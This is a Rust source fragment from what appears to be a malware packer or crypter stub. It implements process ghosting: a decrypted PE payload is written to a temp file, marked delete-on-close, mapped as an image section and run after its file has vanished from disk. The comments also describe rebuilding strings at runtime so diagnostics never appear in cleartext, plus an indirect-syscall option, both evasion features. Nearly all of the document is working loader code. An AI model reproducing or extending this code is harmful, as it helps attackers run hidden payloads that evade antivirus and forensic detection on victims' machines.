// --- Process ghosting (technique fragment) ---
//
// Runs the decrypted PE with no backing file on disk. The payload is written to
// a unique temp file, re-opened with delete-on-close, and turned into an *image*
// section (`NtCreateSection` with `SEC_IMAGE`); the section keeps the bytes
// alive after the file handle closes and the name disappears. The kernel maps
// the image at a base of its choosing and applies its base relocations, so the
// fragment only has to resolve the payload's imports and jump to its entry
// point. See `README.md` for the full write-up.
//
// The section/map pair is the reason this fragment is not Win32-only:
// `CreateFileMappingW` cannot create an image section (it takes `SEC_COMMIT` and
// friends, not `SEC_IMAGE`), and a data section over a delete-pending file is
// refused when opened writable. Both Nt* calls are plain ntdll exports, not part
// of the indirect syscall layer, so `DEF.syscalls` stays empty and the fragment
// is the same for `build.stub.syscalls.mode: none` and `mode: indirect`.
//
// Per-build values (the temp-file stem, every diagnostic) are substituted by
// `Params::render_fragment_for` with code that rebuilds the string at runtime,
// so no stem and no diagnostic ever lands in `.rdata` in cleartext.

use core::ffi::c_void;
use core::ptr;
use core::sync::atomic::{AtomicU32, Ordering};

use windows::core::PCWSTR;
use windows::Wdk::Storage::FileSystem::NtCreateSection;
use windows::Wdk::System::Memory::{NtMapViewOfSection, ViewShare};
use windows::Win32::Foundation::{BOOLEAN, CloseHandle, GetLastError, HANDLE, NTSTATUS};
use windows::Win32::Storage::FileSystem::{
    CreateFileW, FileDispositionInfo, SetFileInformationByHandle, DELETE, FILE_ATTRIBUTE_NORMAL,
    FILE_DISPOSITION_INFO, FILE_READ_DATA, FILE_SHARE_DELETE, FILE_SHARE_READ, FILE_SHARE_WRITE,
    OPEN_EXISTING,
};
use windows::Win32::System::Diagnostics::Debug::{
    IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_NT_HEADERS32, IMAGE_NT_HEADERS64,
};
use windows::Win32::System::Memory::{
    PAGE_READONLY, PAGE_READWRITE, SEC_IMAGE, SECTION_MAP_EXECUTE, SECTION_MAP_READ,
    SECTION_MAP_WRITE,
};
use windows::Win32::System::SystemServices::{
    IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE,
};
use windows::Win32::System::Threading::GetCurrentProcess;

/// The image's NT headers, for the architecture the stub is built for.
#[cfg(target_arch = "x86_64")]
type NtHeaders = IMAGE_NT_HEADERS64;
#[cfg(target_arch = "x86")]
type NtHeaders = IMAGE_NT_HEADERS32;

/// The optional-header magic the payload must have: PE32+ for an x64 stub,
/// PE32 for an x86 one (the packer enforces the same rule at build time).
#[cfg(target_arch = "x86_64")]
const EXPECTED_MAGIC: u16 = 0x20b;
#[cfg(target_arch = "x86")]
const EXPECTED_MAGIC: u16 = 0x10b;

/// Entry point signature of the mapped EXE (returns the process exit code).
type ExeEntryPoint = unsafe extern "system" fn() -> u32;

/// A monotonically increasing suffix so two ghost files in one process never
/// collide on the same temp path.
static GHOST_SEQ: AtomicU32 = AtomicU32::new(0);

/// Formats a failed Win32 call as `"<label> (0x<code>)"`. `label` is
/// substituted with a runtime reconstruction, so the diagnostic text itself is
/// never stored in the stub.
fn win_error(label: String) -> String {
    let code = unsafe { GetLastError().0 };
    format!("{label} (0x{code:08x})")
}

/// Formats a failed Nt* call as `"<label> (0x<status>)"`, the same shape
/// `win_error` uses. A success is any status whose high bit is clear.
fn nt_error(label: String, status: NTSTATUS) -> String {
    format!("{label} (0x{:08x})", status.0 as u32)
}

/// Adapter the stub skeleton calls (`run()` passes the decrypted payload here).
/// Ghosts the payload file, maps it through an image section and runs its entry
/// point after the file has disappeared.
pub fn execute_payload(image: &mut [u8]) -> Result<i32, String> {
    // The payload runs in *this* process and reads its command line from the
    // PEB (`GetCommandLineW`). Repoint it at the payload's own arguments first.
    crate::patch_command_line()?;
    crate::tech_dbg!(
        "process_ghosting",
        "ghosting a {}-byte payload",
        image.len()
    );

    let path = write_temp_file(image)?;
    let file = open_delete_on_close(&path)?;
    let section = create_image_section(file)?;

    // The delete-on-close disposition takes effect when the last file handle
    // closes: the name disappears, but the section keeps the image's pages
    // alive. This is the "ghost": the image runs with no backing file on disk.
    let _ = unsafe { CloseHandle(file) };
    crate::tech_dbg!(
        "process_ghosting",
        "file deleted; the image section keeps the payload"
    );

    let (view, view_size) = map_image(section)?;
    let _ = unsafe { CloseHandle(section) };

    let nt = get_headers(view, view_size)?;
    let image = unsafe { std::slice::from_raw_parts_mut(view, view_size) };
    fix_imports(image, nt)?;
    execute_entrypoint(view, nt)
}

/// Writes the payload to a unique file under the process temp directory and
/// returns its NUL-terminated UTF-16 path.
fn write_temp_file(image: &[u8]) -> Result<Vec<u16>, String> {
    let stem: String = $TEMP_STEM_DEF$;
    let seq = GHOST_SEQ.fetch_add(1, Ordering::Relaxed);
    let path = std::env::temp_dir().join(format!("{stem}_{}_{}", std::process::id(), seq));
    std::fs::write(&path, image).map_err(|_| $MSG_WRITE_FAILED$)?;
    let mut wide: Vec<u16> = path.to_string_lossy().encode_utf16().collect();
    wide.push(0);
    Ok(wide)
}

/// Re-opens the written file with delete access and every share mode, then
/// marks it delete-on-close. Closing the returned handle deletes the file's
/// name; the image section created from it first keeps the bytes alive.
fn open_delete_on_close(path: &[u16]) -> Result<HANDLE, String> {
    let handle = unsafe {
        CreateFileW(
            PCWSTR(path.as_ptr()),
            (FILE_READ_DATA | DELETE).0,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            HANDLE(ptr::null_mut()),
        )
    }
    .map_err(|_| win_error($MSG_OPEN_FAILED$))?;

    let disposition = FILE_DISPOSITION_INFO { DeleteFile: BOOLEAN(1) };
    if unsafe {
        SetFileInformationByHandle(
            handle,
            FileDispositionInfo,
            &disposition as *const FILE_DISPOSITION_INFO as *const c_void,
            std::mem::size_of::<FILE_DISPOSITION_INFO>() as u32,
        )
    }
    .is_err()
    {
        let _ = unsafe { CloseHandle(handle) };
        return Err(win_error($MSG_DISPOSITION_FAILED$));
    }

    Ok(handle)
}

/// Creates an image section (`SEC_IMAGE`) over the ghosted file.
///
/// The image (as opposed to data) section is what makes the technique work: the
/// kernel maps it by RVA, applies the payload's base relocations and gives each
/// section the protection its header asks for, so the mapped view is a real
/// image rather than a raw copy of the file. The section holds the file's pages
/// after the file handle closes, which is what lets the name vanish.
fn create_image_section(file: HANDLE) -> Result<HANDLE, String> {
    let mut section = HANDLE(ptr::null_mut());
    let status = unsafe {
        NtCreateSection(
            &mut section,
            (SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE).0,
            None,
            None,
            PAGE_READONLY.0,
            SEC_IMAGE.0,
            file,
        )
    };
    if status.0 < 0 {
        return Err(nt_error($MSG_SECTION_FAILED$, status));
    }
    Ok(section)
}

/// Maps the image section into this process and returns its base and size.
///
/// The view is requested writable so the imports can be patched in place; the
/// per-section protections come from the image itself.
fn map_image(section: HANDLE) -> Result<(*mut u8, usize), String> {
    let mut base: *mut c_void = ptr::null_mut();
    let mut view_size: usize = 0;
    let status = unsafe {
        NtMapViewOfSection(
            section,
            GetCurrentProcess(),
            &mut base,
            0,
            0,
            None,
            &mut view_size,
            ViewShare,
            0,
            PAGE_READWRITE.0,
        )
    };
    if status.0 < 0 || base.is_null() || view_size == 0 {
        return Err(nt_error($MSG_MAP_FAILED$, status));
    }
    Ok((base as *mut u8, view_size))
}

/// Validates the mapped image and returns its NT headers.
///
/// The view is the kernel's mapping of the payload, so `RVA == offset` from
/// `view` and `view_size` is the image's `SizeOfImage`. Every offset the later
/// helpers index with is checked here, once, before any of them dereferences
/// something the payload claims to own.
fn get_headers(view: *mut u8, view_size: usize) -> Result<*const NtHeaders, String> {
    if view_size < std::mem::size_of::<IMAGE_DOS_HEADER>() {
        return Err($MSG_FILE_TOO_SMALL$);
    }

    unsafe {
        let dos = view as *const IMAGE_DOS_HEADER;
        if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
            return Err($MSG_BAD_DOS$);
        }

        // The NT headers must fit in the mapped image before they are
        // dereferenced.
        let nt_offset = (*dos).e_lfanew as usize;
        let headers_end = nt_offset
            .checked_add(std::mem::size_of::<NtHeaders>())
            .ok_or_else(|| $MSG_HEADERS_OUT_OF_BOUNDS$)?;
        if headers_end > view_size {
            return Err($MSG_HEADERS_OUT_OF_BOUNDS$);
        }

        let nt = view.add(nt_offset) as *const NtHeaders;
        if (*nt).Signature != IMAGE_NT_SIGNATURE {
            return Err($MSG_BAD_NT$);
        }

        // The packer already rejects a payload whose arch differs from
        // `build.output.arch`, but keep a defensive check here.
        let magic = (*nt).OptionalHeader.Magic.0;
        if magic != EXPECTED_MAGIC {
            return Err(format!("{} (magic 0x{magic:04x})", $MSG_BAD_ARCH$));
        }

        // The view is `SizeOfImage` bytes: a header that claims a different
        // image size means the mapping and the headers disagree about what is
        // owned, so neither can be trusted.
        if (*nt).OptionalHeader.SizeOfImage as usize != view_size {
            return Err($MSG_IMAGE_SIZE_INVALID$);
        }

        let entry_rva = (*nt).OptionalHeader.AddressOfEntryPoint as usize;
        if entry_rva != 0 && entry_rva >= view_size {
            return Err($MSG_ENTRY_OUT_OF_BOUNDS$);
        }

        Ok(nt)
    }
}

/// Resolves the payload's imports and writes them into its IAT. The mapped
/// view is the image, so RVA == offset from the view base; the shared resolver
/// makes the IAT writable only while it writes.
fn fix_imports(image: &mut [u8], nt: *const NtHeaders) -> Result<(), String> {
    let import_dir =
        unsafe { (*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT.0 as usize] };
    if import_dir.Size == 0 || import_dir.VirtualAddress == 0 {
        return Ok(());
    }

    let count = crate::patch_imports(
        image,
        import_dir.VirtualAddress,
        import_dir.Size,
        crate::resolution_policy,
    )
    .map_err(|e| e.to_string())?;
    crate::tech_dbg!("process_ghosting", "IAT patched ({count} import(s))");
    Ok(())
}

/// Runs the payload's entry point on this thread and returns its exit code.
///
/// The payload keeps the stub's thread rather than getting a fresh one, exactly
/// like reflective loading: a payload that calls `ExitProcess` ends the process
/// as it would from a thread it created itself.
fn execute_entrypoint(view: *mut u8, nt: *const NtHeaders) -> Result<i32, String> {
    let entry_rva = unsafe { (*nt).OptionalHeader.AddressOfEntryPoint } as usize;
    if entry_rva == 0 {
        return Err($MSG_NO_ENTRY$);
    }

    let entry_point = view as usize + entry_rva;
    crate::tech_dbg!("process_ghosting", "jumping to entry point 0x{entry_point:x}");
    // SAFETY: `entry_point` is the payload's `AddressOfEntryPoint` inside the
    // image section mapping (bounds-checked in `get_headers`), with a matching
    // ABI.
    let exe_main: ExeEntryPoint = unsafe { std::mem::transmute(entry_point) };
    let code = unsafe { exe_main() } as i32;
    crate::tech_dbg!("process_ghosting", "payload returned {code}");
    Ok(code)
}
